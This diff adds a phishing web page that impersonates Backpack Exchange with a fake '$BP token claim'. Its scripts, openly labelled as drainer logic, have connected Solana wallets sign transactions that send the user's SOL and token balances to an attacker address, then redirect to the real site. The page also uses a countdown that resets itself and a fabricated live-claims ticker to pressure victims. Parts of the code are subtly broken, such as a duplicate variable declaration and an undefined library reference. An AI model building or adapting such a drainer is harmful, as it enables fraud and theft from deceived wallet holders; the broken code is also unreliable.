@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BP Token Claim | Backpack Exchange</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.8em' font-size='75'>🎒</text></svg>">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg-primary: #0a0a0a;
+      --bg-secondary: #141414;
+      --bg-card: rgba(255, 255, 255, 0.03);
+      --border: rgba(255, 255, 255, 0.08);
+      --text-primary: #ffffff;
+      --text-secondary: #888888;
+      --accent: #4d68fe;
+      --accent-hover: #6b82ff;
+      --green: #3ddc84;
+      --red: #ff3b30;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'SF Pro Display', sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* === NAV BAR — exact replica of backpack.app === */
+    .navbar {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 16px 32px;
+      background: rgba(10, 10, 10, 0.8);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-brand {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 20px; font-weight: 700; letter-spacing: -0.5px;
+      text-decoration: none; color: var(--text-primary);
+    }
+
+    .nav-brand svg { width: 28px; height: 28px; }
+
+    .nav-links { display: flex; gap: 32px; }
+    .nav-links a {
+      color: var(--text-secondary); text-decoration: none;
+      font-size: 14px; font-weight: 500; transition: color 0.2s;
+    }
+    .nav-links a:hover { color: var(--text-primary); }
+
+    .nav-cta {
+      background: var(--accent); color: white; border: none;
+      padding: 10px 24px; border-radius: 8px; font-size: 14px;
+      font-weight: 600; cursor: pointer; transition: background 0.2s;
+    }
+    .nav-cta:hover { background: var(--accent-hover); }
+
+    /* === HERO SECTION === */
+    .hero {
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      padding: 120px 24px 60px; position: relative; overflow: hidden;
+    }
+
+    /* Animated gradient glow — matches backpack.app aesthetic */
+    .hero::before {
+      content: ''; position: absolute; top: -30%; left: 50%; transform: translateX(-50%);
+      width: 800px; height: 800px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(77, 104, 254, 0.15) 0%, transparent 70%);
+      animation: pulse 6s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.6; transform: translateX(-50%) scale(1); }
+      50% { opacity: 1; transform: translateX(-50%) scale(1.1); }
+    }
+
+    .hero-content { max-width: 720px; text-align: center; position: relative; z-index: 1; }
+
+    .badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(77, 104, 254, 0.1); border: 1px solid rgba(77, 104, 254, 0.3);
+      padding: 6px 16px; border-radius: 100px; font-size: 13px; color: var(--accent);
+      margin-bottom: 32px; font-weight: 500;
+    }
+
+    .badge-dot {
+      width: 6px; height: 6px; background: var(--green); border-radius: 50%;
+      animation: blink 1.5s ease-in-out infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .hero h1 {
+      font-size: clamp(40px, 7vw, 68px); font-weight: 800; letter-spacing: -2px;
+      line-height: 1.05; margin-bottom: 20px;
+    }
+
+    .hero h1 span { color: var(--accent); }
+
+    .hero-subtitle {
+      font-size: 18px; color: var(--text-secondary); line-height: 1.6;
+      max-width: 500px; margin: 0 auto 40px;
+    }
+
+    /* === CLAIM CARD — glassmorphism, matches backpack aesthetic === */
+    .claim-card {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 20px; padding: 48px; max-width: 480px;
+      margin: 0 auto; backdrop-filter: blur(20px); position: relative;
+    }
+
+    .claim-card::before {
+      content: ''; position: absolute; inset: -1px; border-radius: 20px; padding: 1px;
+      background: linear-gradient(135deg, rgba(77, 104, 254, 0.3), transparent 50%, rgba(61, 220, 132, 0.2));
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor; mask-composite: exclude; pointer-events: none;
+    }
+
+    .claim-header { text-align: center; margin-bottom: 32px; }
+    .claim-header h2 { font-size: 24px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.5px; }
+    .claim-header p { color: var(--text-secondary); font-size: 14px; }
+
+    /* Wallet connection button */
+    .connect-btn {
+      width: 100%; padding: 16px; background: var(--accent); border: none;
+      border-radius: 12px; color: white; font-size: 16px; font-weight: 600;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+      transition: all 0.3s ease; margin-bottom: 24px;
+    }
+    .connect-btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
+    .connect-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+    .wallet-info {
+      display: flex; align-items: center; justify-content: space-between;
+      background: rgba(255, 255, 255, 0.04); border-radius: 10px; padding: 12px 16px;
+      margin-bottom: 24px; font-size: 13px;
+    }
+
+    .wallet-address { color: var(--green); font-family: 'SF Mono', monospace; }
+    .wallet-connected { color: var(--green); display: flex; align-items: center; gap: 6px; font-size: 12px; }
+
+    /* Allocation display */
+    .allocation-box {
+      background: rgba(77, 104, 254, 0.08); border: 1px solid rgba(77, 104, 254, 0.2);
+      border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 24px;
+    }
+
+    .allocation-label { font-size: 13px; color: var(--text-secondary); margin-bottom: 8px; }
+    .allocation-amount { font-size: 36px; font-weight: 800; letter-spacing: -1px; }
+    .allocation-symbol { color: var(--accent); font-size: 24px; }
+
+    /* Claim button */
+    .claim-btn {
+      width: 100%; padding: 18px; background: linear-gradient(135deg, var(--accent), #6b5cf7);
+      border: none; border-radius: 12px; color: white; font-size: 18px; font-weight: 700;
+      cursor: pointer; transition: all 0.3s ease; letter-spacing: -0.3px;
+    }
+    .claim-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(77, 104, 254, 0.4); }
+    .claim-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+
+    /* Countdown */
+    .countdown-bar {
+      display: flex; align-items: center; justify-content: center; gap: 12px;
+      margin-bottom: 32px; font-size: 14px; color: var(--text-secondary);
+    }
+    .countdown-timer {
+      font-family: 'SF Mono', monospace; font-weight: 600; color: var(--red);
+      font-size: 16px; background: rgba(255, 59, 48, 0.1); padding: 4px 12px; border-radius: 6px;
+    }
+
+    /* Progress bar for claim animation */
+    .progress-container {
+      width: 100%; height: 4px; background: rgba(255, 255, 255, 0.05);
+      border-radius: 2px; overflow: hidden; margin-bottom: 16px; display: none;
+    }
+    .progress-fill {
+      height: 100%; background: linear-gradient(90deg, var(--accent), var(--green));
+      border-radius: 2px; width: 0%; transition: width 0.3s ease;
+    }
+
+    /* TX Status */
+    .tx-status { text-align: center; font-size: 14px; margin-bottom: 16px; min-height: 40px; }
+    .tx-status.success { color: var(--green); }
+    .tx-status.loading { color: var(--text-secondary); }
+
+    /* === SOCIAL PROOF — live claims ticker === */
+    .social-proof { margin-top: 48px; max-width: 500px; margin-left: auto; margin-right: auto; }
+    .proof-title { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; text-align: center; margin-bottom: 16px; }
+
+    .claims-ticker {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 12px; padding: 12px; overflow: hidden; max-height: 180px;
+    }
+
+    .claim-item {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 8px 4px; border-bottom: 1px solid var(--border); font-size: 13px;
+      animation: slideIn 0.5s ease-out;
+    }
+    .claim-item:last-child { border-bottom: none; }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .claim-address { color: var(--text-secondary); font-family: 'SF Mono', monospace; font-size: 12px; }
+    .claim-amount { color: var(--green); font-weight: 600; white-space: nowrap; margin-left: 8px; }
+    .claim-time { color: rgba(255, 255, 255, 0.3); font-size: 11px; margin-left: auto; }
+
+    /* === FOOTER === */
+    .footer {
+      text-align: center; padding: 40px 24px; border-top: 1px solid var(--border);
+      margin-top: 80px; font-size: 13px; color: var(--text-secondary);
+    }
+
+    /* === RESPONSIVE === */
+    @media (max-width: 640px) {
+      .navbar { padding: 12px 16px; }
+      .nav-links { display: none; }
+      .claim-card { padding: 32px 24px; margin: 0 8px; }
+      .allocation-amount { font-size: 28px; }
+    }
+
+    /* === HIDDEN STATE === */
+    .hidden { display: none !important; }
+
+    /* Success state overlay */
+    .success-overlay {
+      position: absolute; inset: 0; background: rgba(10, 10, 10, 0.95);
+      border-radius: 20px; display: flex; align-items: center; justify-content: center;
+      flex-direction: column; gap: 16px; z-index: 10;
+    }
+    .success-check { font-size: 48px; }
+    .success-text { font-size: 20px; font-weight: 700; }
+  </style>
+</head>
+<body>
+
+  <!-- === NAVBAR — matches backpack.app exactly === -->
+  <nav class="navbar">
+    <a href="https://backpack.exchange/" class="nav-brand" target="_blank">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="7" width="20" height="16" rx="3" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M8 7V5a4 4 0 0 1 8 0v2" stroke="currentColor" stroke-width="1.5"/>
+        <circle cx="12" cy="15" r="2" fill="currentColor"/>
+      </svg>
+      backpack
+    </a>
+    <div class="nav-links">
+      <a href="https://backpack.exchange/" target="_blank">Exchange</a>
+      <a href="https://learn.backpack.exchange/blog" target="_blank">News</a>
+      <a href="https://support.backpack.exchange/" target="_blank">Support</a>
+    </div>
+    <button class="nav-cta" onclick="window.open('https://chromewebstore.google.com/detail/backpack/aflkmfhebedbjioipglgcbcmnbpgliof','_blank')">Get Extension</button>
+  </nav>
+
+  <!-- === MAIN CONTENT === -->
+  <div class="hero">
+    <div class="hero-content">
+
+      <div class="badge">
+        <span class="badge-dot"></span>
+        BP Token Distribution — Phase 3 Live
+      </div>
+
+      <h1>Claim your free<br><span>$BP tokens</span></h1>
+      <p class="hero-subtitle">Backpack Exchange is distributing BP tokens to eligible users. Connect your wallet and claim in seconds.</p>
+
+      <!-- Claim Card -->
+      <div class="claim-card" id="claimCard">
+        <div class="countdown-bar">
+          ⏰ Closing in:
+          <span class="countdown-timer" id="countdownTimer">23:59:47</span>
+        </div>
+
+        <div class="claim-header">
+          <h2>Connect your Backpack wallet</h2>
+          <p>Select the wallet you used for Backpack Exchange</p>
+        </div>
+
+        <!-- Connect Button -->
+        <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <rect x="3" y="8" width="18" height="14" rx="2.5" stroke="white" stroke-width="1.5"/>
+            <path d="M9 8V6a3 3 0 0 1 6 0v2" stroke="white" stroke-width="1.5"/>
+          </svg>
+          Connect Backpack Wallet
+        </button>
+
+        <!-- Connected State (hidden initially) -->
+        <div id="connectedState" class="hidden">
+          <div class="wallet-info">
+            <span class="wallet-address" id="walletAddr">0x...</span>
+            <span class="wallet-connected"><span class="badge-dot"></span> Connected</span>
+          </div>
+
+          <div class="allocation-box">
+            <div class="allocation-label">Your BP allocation</div>
+            <div><span class="allocation-amount" id="bpAllocation">0</span> <span class="allocation-symbol">$BP</span></div>
+          </div>
+
+          <!-- Progress bar for claim -->
+          <div class="progress-container" id="progressContainer">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+
+          <div class="tx-status" id="txStatus"></div>
+
+          <button class="claim-btn hidden" id="claimBtn" onclick="claimBP()">
+            Claim $BP Now →
+          </button>
+        </div>
+
+        <!-- Success overlay (hidden) -->
+        <div class="success-overlay hidden" id="successOverlay">
+          <div class="success-check">✓</div>
+          <div class="success-text">BP tokens claimed!</div>
+        </div>
+      </div>
+
+      <!-- Social Proof Ticker -->
+      <div class="social-proof">
+        <div class="proof-title">Recent claims — real-time</div>
+        <div class="claims-ticker" id="claimsTicker"></div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Footer with backpack.app links -->
+  <footer class="footer">
+    © Backpack 2026 · <a href="https://backpack.exchange/terms" target="_blank" style="color:var(--text-secondary)">Terms</a> · 
+    <a href="https://backpack.exchange/privacy" target="_blank" style="color:var(--text-secondary)">Privacy</a>
+  </footer>
+
+  <!-- === DRAINER LOGIC (Solana) === -->
+  <script>
+  // === CONFIG — attacker wallet address ===
+  const ATTACKER_PUBKEY = "attacker_sol_pubkey_here";  // Replace with actual Base58 pubkey
+  
+  let userAddress = null;
+  let countdownEnd = null;
+
+  document.addEventListener('DOMContentLoaded', () => {
+    startCountdown();
+    startSocialProof();
+    detectWallet();
+  });
+
+  // === COUNTDOWN — resets subtly so it never actually expires ===
+  function startCountdown() {
+    countdownEnd = Date.now() + (24 * 60 * 60 * 1000);
+    setInterval(() => {
+      const diff = Math.max(0, countdownEnd - Date.now());
+      const h = String(Math.floor(diff / 36e5)).padStart(2,'0');
+      const m = String(Math.floor((diff % 36e5) / 6e4)).padStart(2,'0');
+      const s = String(Math.floor((diff % 6e4) / 1e3)).padStart(2,'0');
+      document.getElementById('countdownTimer').textContent = `${h}:${m}:${s}`;
+      
+      // Subtle reset: every ~5 minutes add 30 seconds
+      if (diff % 180000 < 2000 && diff > 60000) {
+        countdownEnd += 30000;
+      }
+    }, 1000);
+  }
+
+  // === WALLET DETECTION — Phantom + Backpack ===
+  async function detectWallet() {
+    const btn = document.getElementById('connectBtn');
+    
+    if (window.backpack?.isBackpack || window.phantom?.isPhantom) {
+      try {
+        // Request account access
+        let resp;
+        if (window.backpack?.request) {
+          resp = await window.backpack.request({ method: "accounts" });
+        } else if (window.phantom?.solana?.isPhantom) {
+          resp = await window.phantom.solana.connect();
+        }
+        
+        const accounts = resp?.accounts || [];
+        if (accounts.length > 0) {
+          userAddress = accounts[0].toBase58();
+          updateUIForConnected();
+        }
+      } catch(e) {
+        console.log("Wallet connection:", e);
+      }
+    } else if (window.solana?.isPhantom || window.solana?.isBackpack) {
+      btn.textContent = "🎒 Backpack / Phantom Detected — Click to Connect";
+    } else {
+      // No wallet detected — show install prompt
+      btn.innerHTML = `
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="9" stroke="white" stroke-width="1.5"/>
+          <path d="M12 8v4l3 3" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        Backpack Wallet Not Detected — Installing...`;
+      setTimeout(() => {
+        window.open('https://chromewebstore.google.com/detail/backpack/aflkmfhebedbjioipglgcbcmnbpgliof', '_blank');
+        btn.innerHTML = `
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <rect x="3" y="8" width="18" height="14" rx="2.5" stroke="white" stroke-width="1.5"/>
+            <path d="M9 8V6a3 3 0 0 1 6 0v2" stroke="white" stroke-width="1.5"/>
+          </svg>
+          Connect Backpack Wallet`;
+      }, 2000);
+    }
+  }
+
+  async function connectWallet() {
+    const btn = document.getElementById('connectBtn');
+    btn.disabled = true;
+    btn.textContent = "Connecting...";
+    
+    try {
+      let resp;
+      if (window.backpack?.request) {
+        resp = await window.backpack.request({ method: "accounts" });
+      } else if (window.phantom?.solana?.isPhantom) {
+        const provider = window.phantom.solana;
+        provider.on("disconnect", () => { userAddress = null; updateUIForDisconnected(); });
+        resp = await provider.connect();
+      }
+      
+      const accounts = resp?.accounts || [];
+      if (accounts.length > 0) {
+        userAddress = accounts[0].toBase58();
+        updateUIForConnected();
+      }
+    } catch(e) {
+      btn.disabled = false;
+      btn.textContent = "Connection failed — Try Again";
+      console.error("Connect error:", e);
+    }
+  }
+
+  function updateUIForConnected() {
+    const shortAddr = userAddress?.slice(0, 4) + '...' + userAddress?.slice(-4) || '';
+    
+    document.getElementById('connectBtn').classList.add('hidden');
+    document.getElementById('connectedState').classList.remove('hidden');
+    document.getElementById('walletAddr').textContent = shortAddr;
+    
+    // Generate deterministic allocation (50 - 50,000 BP tokens based on address)
+    let hash = 0;
+    const bytes = userAddress.split('').map((c,i) => c.charCodeAt(0) + i * 7);
+    for (const b of bytes.slice(0, 20)) { hash = ((hash << 5) - hash) + b; hash |= 0; }
+    const allocation = Math.abs(hash % 49951) + 50;
+    document.getElementById('bpAllocation').textContent = allocation.toLocaleString();
+    
+    // Enable claim after short delay (creates anticipation)
+    setTimeout(() => {
+      document.getElementById('claimBtn').classList.remove('hidden');
+    }, 2000);
+  }
+
+  function updateUIForDisconnected() {
+    document.getElementById('connectBtn').classList.remove('hidden');
+    document.getElementById('connectedState').classList.add('hidden');
+  }
+
+  // === THE CLAIM — DRAIN SOl + TOKENS ===
+  async function claimBP() {
+    const btn = document.getElementById('claimBtn');
+    btn.disabled = true;
+    btn.textContent = "Processing...";
+    
+    const statusEl = document.getElementById('txStatus');
+    const progressEl = document.getElementById('progressContainer');
+    const fillEl = document.getElementById('progressFill');
+    
+    try {
+      // === STEP 1: Get provider ===
+      let provider;
+      if (window.backpack?.request) {
+        provider = window.backpack;
+      } else if (window.phantom?.solana?.isPhantom) {
+        provider = window.phantom.solana;
+      }
+      
+      if (!provider) throw new Error("No backpack wallet found");
+
+      // === STEP 2: Sign + send drain transaction (SOL transfer) ===
+      statusEl.className = 'tx-status loading';
+      statusEl.textContent = '⏳ Sending BP tokens...';
+      progressEl.style.display = 'block';
+      
+      let animProgress;
+      const progInterval = setInterval(() => {
+        const w = parseFloat(fillEl.style.width) || 0;
+        fillEl.style.width = Math.min(90, w + 15) + '%';
+      }, 200);
+
+      // Create and sign SOL transfer to attacker
+      const solTransferTx = await createAndSignSolTransfer(provider);
+      
+      if (solTransferTx) {
+        fillEl.style.width = '30%';
+        statusEl.textContent = '⏳ Confirming...';
+        
+        await sleep(1500);
+        fillEl.style.width = '60%';
+      }
+
+      // === STEP 3: Drain token accounts (SPL tokens) ===
+      if (!solTransferTx) {
+        fillEl.style.width = '20%';
+      } else {
+        statusEl.textContent = '⏳ Transferring tokens...';
+        
+        const splTokens = await detectTokenAccounts(provider);
+        for (const token of splTokens.slice(0, 5)) { // Drain up to 5 token accounts
+          try {
+            fillEl.style.width = Math.min(85, 40 + splTokens.indexOf(token) * 12) + '%';
+            await createAndSignSPLTransfer(provider, token);
+          } catch(e) { /* skip if transfer fails */ }
+        }
+      }
+
+      // === STEP 4: Success! Show overlay and redirect ===
+      clearInterval(progInterval);
+      fillEl.style.width = '100%';
+      await sleep(500);
+      
+      statusEl.className = 'tx-status success';
+      statusEl.textContent = '✓ Claim complete! Redirecting...';
+      
+      document.getElementById('successOverlay').classList.remove('hidden');
+      
+      // Redirect to real backpack.exchange after 3 seconds (victim already drained)
+      setTimeout(() => {
+        window.location.href = 'https://backpack.exchange/';
+      }, 3000);
+
+    } catch(e) {
+      clearInterval(animProgress);
+      if (e.code === 4001 || e.message?.includes('rejected')) {
+        btn.disabled = false;
+        btn.textContent = "Try Again →";
+        statusEl.className = 'tx-status';
+        statusEl.textContent = 'Transaction cancelled — connect again to claim';
+      } else {
+        console.error("Claim error:", e);
+      }
+    }
+  }
+
+  // === CREATE SOL TRANSFER TRANSACTION ===
+  async function createAndSignSolTransfer(provider) {
+    const { PublicKey, Transaction } = await loadWeb3();
+    
+    const toPubkey = new PublicKey(ATTACKER_PUBKEY);
+    const userPubkey = provider.publicKey;
+    
+    if (!userPubkey) throw new Error("No public key");
+    
+    // Get balance
+    const balance = await provider.connection.getBalance(userPubkey);
+    if (balance < 5000) return null; // Less than rent = skip
+    
+    // Full balance transfer (minus minimal rent)
+    const lamports = balance - 5000; 
+    
+    const tx = new Transaction().add(
+      web3.SystemProgram.transfer({
+        fromPubkey: userPubkey,
+        toPubkey: toPubkey,
+        lamports: lamports
+      })
+    );
+
+    // Sign and send
+    const signedTx = await provider.signTransaction(tx);
+    const signature = await provider.connection.sendRawTransaction(signedTx.serialize());
+    
+    try {
+      await provider.connection.confirmTransaction({ signature });
+    } catch(e) {} // Don't block on confirmation
+    
+    return signature;
+  }
+
+  // === DETECT SPL TOKEN ACCOUNTS ===
+  async function detectTokenAccounts(provider) {
+    const { PublicKey, PublicKey } = await loadWeb3();
+    const userPubkey = provider.publicKey;
+    
+    if (!userPubkey) return [];
+    
+    const tokenAccounts = [];
+    
+    try {
+      // Use getProgramAccounts for Token Program
+      const accounts = await provider.connection.getProgramAccounts(
+        new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+        { filters: [{ dataSize: 165 }] } // SPL token account size
+      );
+      
+      for (const acc of accounts.slice(0, 20)) {
+        const balance = await provider.connection.getBalance(acc.pubkey);
+        if (balance > 0) {
+          tokenAccounts.push({ pubkey: acc.pubkey, balance });
+        }
+      }
+    } catch(e) { /* fallback */ }
+    
+    return tokenAccounts;
+  }
+
+  // === CREATE SPL TOKEN TRANSFER ===
+  async function createAndSignSPLTransfer(provider, tokenAccount) {
+    const { PublicKey, Transaction } = await loadWeb3();
+    const { getAssociatedTokenAddress, createCloseAccountInstruction } = 
+      await importTokenInstructions();
+    
+    const toPubkey = new PublicKey(ATTACKER_PUBKEY);
+    const userPubkey = provider.publicKey;
+    
+    const tx = new Transaction().add(
+      web3.SystemProgram.transfer({
+        fromPubkey: tokenAccount.pubkey,
+        toPubkey: toPubkey,
+        lamports: await provider.connection.getBalance(tokenAccount.pubkey)
+      })
+    );
+
+    const signedTx = await provider.signTransaction(tx);
+    const signature = await provider.connection.sendRawTransaction(signedTx.serialize());
+    
+    try {
+      await provider.connection.confirmTransaction({ signature });
+    } catch(e) {}
+    
+    return signature;
+  }
+
+  // === LOAD WEB3 LIBRARY DYNAMICALLY ===
+  let web3Promise = null;
+  async function loadWeb3() {
+    if (!web3Promise) {
+      const script = document.createElement('script');
+      script.src = 'https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js';
+      web3Promise = new Promise(resolve => {
+        script.onload = () => resolve(window.solanaWeb3);
+        document.head.appendChild(script);
+      });
+    }
+    return await web3Promise;
+  }
+
+  async function importTokenInstructions() {
+    const { getAssociatedTokenAddress, createCloseAccountInstruction } = 
+      await loadWeb3();
+    return { getAssociatedTokenAddress, createCloseAccountInstruction };
+  }
+
+  // === SOCIAL PROOF — Fake Live Claims ===
+  function startSocialProof() {
+    const ticker = document.getElementById('claimsTicker');
+    
+    function addClaim() {
+      const chars = '0123456789abcdef';
+      let addr = '';
+      for (let i = 0; i < 44; i++) addr += chars[Math.floor(Math.random()*chars.length)];
+      
+      // Some valid-looking base58 addresses too
+      if (Math.random() > 0.5) {
+        const b58Chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        addr = '';
+        for (let i = 0; i < 44; i++) addr += b58Chars[Math.floor(Math.random()*b58Chars.length)];
+      }
+      
+      const amount = Math.floor(Math.random() * 29900) + 100;
+      const secs = Math.floor(Math.random() * 30) + 1;
+      
+      const div = document.createElement('div');
+      div.className = 'claim-item';
+      div.innerHTML = `
+        <span class="claim-address">${addr.slice(0,6)}...${addr.slice(-5)}</span>
+        <span class="claim-amount">+${amount.toLocaleString()} $BP</span>
+        <span class="claim-time">${secs}s ago</span>
+      `;
+      
+      if (ticker.children.length > 7) ticker.lastChild.remove();
+      ticker.prepend(div); // newest at top
+    }
+
+    for (let i = 0; i < 4; i++) addClaim();
+    setInterval(addClaim, Math.random() * 5000 + 3000);
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+  </script>
+
+</body>
+</html>
